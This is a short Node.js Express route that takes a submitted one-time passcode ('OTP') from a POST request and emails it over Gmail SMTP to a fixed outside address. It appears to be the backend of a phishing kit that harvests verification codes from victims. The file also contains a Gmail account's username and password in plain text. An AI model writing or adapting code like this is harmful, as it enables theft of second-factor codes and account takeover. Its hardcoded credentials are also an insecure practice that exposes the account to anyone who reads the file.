const router = require('express').Router();
const nodeMailer = require("nodemailer");

router.post("/", async (req, res) => {
    let code = req.body.OTP
    let transporter = nodeMailer.createTransport({
        host: "smtp.gmail.com",
        port: 465,
        secure: true,
        auth: {
            user: "milhas.jean@gmail.com",
            pass: "Simple87-",
        },
    });
    let mailOptions = {
        from: '"Krunal Lathiya"', // sender address
        to: "Warren.kiriakou@gmail.com", // list of receivers
        subject: `new verification code recieved`, // Subject line
        html: `<p><b>code:</b>${code}</p>
      `, // html body
    };
    try {
        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.log(error);
                return res.send(error);
            }
            console.log("Message %s sent: %s", info.messageId, info.response);
            res.send("success");
        });
    } catch (error) {
        console.log(error);
        res.send(error);
    }
});

module.exports = router;